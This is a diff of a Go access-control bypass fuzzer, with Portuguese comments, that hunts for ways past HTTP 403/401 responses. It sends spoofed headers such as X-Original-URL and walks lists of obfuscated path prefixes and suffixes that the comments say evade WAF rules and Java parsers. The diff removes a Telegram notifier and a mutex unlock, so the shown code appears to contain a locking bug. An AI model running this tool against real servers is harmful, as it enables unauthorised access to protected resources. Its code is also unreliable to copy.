@@ -17,6 +17,7 @@ import (
 	"time"
 )
 
+// TarefaBypass é a missão que o Fuzzer joga no canal
 type TarefaBypass struct {
 	URL           string
 	StatusOrigial int
@@ -28,32 +29,6 @@ type ResultadoBypass struct {
 	Tecnica   string `json:"tecnica_utilizada"`
 	Sucesso   string `json:"payload_sucesso"`
 	Timestamp string `json:"timestamp"`
-}
-
-func telegram(mensagem string) {
-	var telegram_key string = "<INSIRA_SUA_CHAVE_API_DO_TELEGRAM_AQUI>"
-	var chat_id string = "<INSIRA_ID_DO_SEU_CHAT_TELEGRAM_AQUI>"
-
-	api_url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegram_key)
-
-	dados := url.Values{}
-	dados.Set("chat_id", chat_id)
-	dados.Set("text", mensagem)
-	dados.Set("parse_mode", "Markdown")
-
-	resp, err := http.PostForm(api_url, dados)
-	if err != nil {
-		fmt.Printf(momento(tempo)+" - [ERRO] Falha ao conectar na API do Telegram: %v\n", err)
-		return
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode == 200 {
-		fmt.Printf("%s", momento(tempo)+" - [INFO] Notificação enviada para o celular com sucesso!\n")
-	} else {
-		fmt.Printf(momento(tempo)+" - [ERRO] Telegram retornou status HTTP %d\n", resp.StatusCode)
-	}
-
 }
 
 var tempo string
@@ -88,7 +63,6 @@ func salvarAchadoBypass(dominio string, resultado ResultadoBypass) {
 		f.WriteString(string(linhaJSON) + "\n")
 		f.Close()
 	}
-	muBypass.Unlock()
 
 }
 
@@ -96,7 +70,7 @@ func carregarEstado(caminhoEstado string) map[string]bool {
 	estado := make(map[string]bool)
 	arquivo, err := os.Open(caminhoEstado)
 	if err != nil {
-		return estado
+		return estado // Se não existe, retorna vazio (primeira execução)
 	}
 	defer arquivo.Close()
 
@@ -119,17 +93,17 @@ var HeadersBypass = map[string]string{
 }
 
 var SufixosBypass = []string{
-	"", "/", "..;/", "/..;/", "%20", "%09", "%00", 
-	".json", ".css", ".html", ".js", 
-	";.json", ";.css", ";.html", 
-	"?", "??", "&", "#", 
+	"", "/", "..;/", "/..;/", "%20", "%09", "%00", // Caracteres em branco e manipulação final
+	".json", ".css", ".html", ".js", // Falsificação de recursos estáticos (Bypass de regras de WAF)
+	";.json", ";.css", ";.html", // Matrix Parameter + Falsificação estática (Combo letal)
+	"?", "??", "&", "#", // Fragmentação de query
 }
 
 var PrefixosBypass = []string{
-	"/", "/*/", "//", "///", "/\\/", "/%5c/", 
-	"/%2e/", "/%252e/", "/%ef%bc%8f/", 
-	"/;/;/../", "/.;/", "/..;/", "/...;/", 
-	"/%00/", 
+	"/", "/*/", "//", "///", "/\\/", "/%5c/", // Mutações de barras (Slashes)
+	"/%2e/", "/%252e/", "/%ef%bc%8f/", // Single Encode, Double Encode, Unicode Fullwidth
+	"/;/;/../", "/.;/", "/..;/", "/...;/", // Abusos de Matrix Parameters (Java/Spring/Tomcat)
+	"/%00/", // Null Byte Injection (Ignorado por muitos WAFs, quebra o parser)
 }
 
 func alternarCaixa(caminho string) []string {
@@ -154,12 +128,19 @@ func clientBypass() *http.Client {
 		Transport: transport,
 		Timeout:   2 * time.Second,
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse 
+			return http.ErrUseLastResponse // Impede o follow redirect cego
 		},
 	}
 }
 
 func Jitter(mindelay int, maxdelay int) {
+	if mindelay < 0 {
+		mindelay = 0
+	}
+	if maxdelay <= mindelay {
+		time.Sleep(time.Duration(mindelay) * time.Millisecond)
+		return
+	}
 	delta := maxdelay - mindelay
 	rand_time, err := rand.Int(rand.Reader, big.NewInt(int64(delta)))
 	if err != nil {
@@ -182,12 +163,13 @@ func WorkerBypass(canalTarefas <-chan TarefaBypass, wg *sync.WaitGroup, telegram
 		}
 
 		dominio := parsedURL.Hostname()
-		req, err := client.Get(dominio)
+		req, err := client.Get(tarefa.URL)
 		if err != nil {
 			continue
 		}
 		status := req.StatusCode
-		if status != 403 {
+		req.Body.Close()
+		if status != 403 && status != 401 {
 			continue
 		}
 
@@ -208,6 +190,7 @@ func WorkerBypass(canalTarefas <-chan TarefaBypass, wg *sync.WaitGroup, telegram
 			req, _ := http.NewRequest("GET", tarefa.URL, nil)
 			req.Header.Set(nomeHeader, valorHeader)
 
+			// Teste de Overriding de URL
 			req.Header.Set("X-Original-URL", caminhoOriginal)
 			req.Header.Set("X-Rewrite-URL", caminhoOriginal)
 			req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0")
@@ -220,6 +203,7 @@ func WorkerBypass(canalTarefas <-chan TarefaBypass, wg *sync.WaitGroup, telegram
 
 		for _, prefixo := range PrefixosBypass {
 			for _, sufixo := range SufixosBypass {
+				// Reconstrói a URL: host + prefixo ofuscado + caminho original (sem barra inicial) + sufixo
 				caminhoMutado := prefixo + strings.TrimPrefix(caminhoOriginal, "/") + sufixo
 				urlMutada := host + caminhoMutado
 
@@ -278,7 +262,7 @@ func WorkerBypass(canalTarefas <-chan TarefaBypass, wg *sync.WaitGroup, telegram
 				resultado := ResultadoBypass{
 					Alvo:      tarefa.URL,
 					Status:    tarefa.StatusOrigial,
-					Tecnica:   strings.Split(s, ": ")[0], 
+					Tecnica:   strings.Split(s, ": ")[0], // Ex: "Header Spoofing"
 					Sucesso:   s,
 					Timestamp: time.Now().Format(time.RFC3339),
 				}
@@ -298,6 +282,7 @@ func WorkerBypass(canalTarefas <-chan TarefaBypass, wg *sync.WaitGroup, telegram
 	}
 }
 
+// obterBaseline mede o tamanho da resposta 403 original para evitar Falsos Positivos
 type BaselineHost struct {
 	OriginalStatus int
 	OriginalLength int
@@ -339,7 +324,7 @@ func avaliarTiro(client *http.Client, req *http.Request, base BaselineHost) bool
 	body, _ := io.ReadAll(resp.Body)
 	bodyLen := len(body)
 
-	if resp.StatusCode == 401 || resp.StatusCode == 403 {
+	if resp.StatusCode != http.StatusOK || bodyLen == 0 || (base.OriginalStatus != 401 && base.OriginalStatus != 403) || base.FantasmaStatus == 0 {
 		return false
 	}
 
@@ -353,14 +338,15 @@ func avaliarTiro(client *http.Client, req *http.Request, base BaselineHost) bool
 			diff404 = -diff404
 		}
 		if float64(diff404) <= float64(base.FantasmaLength)*0.05 {
-			return false 
+			return false // Falso Bypass (Caiu na página de NotFound ou Home padrão do WAF)
 		}
 	}
 
+	// Se chegou aqui, retornou 200 OK e a página é DIFERENTE da página de 404. É OURO!
 	return true
 }
 
-func momento(agora string) string { 
+func momento(agora string) string { //Função para formato extenso com horário detalhado
 	agora = time.Now().Format("2006-01-02 15:04:05")
 	return agora
 }
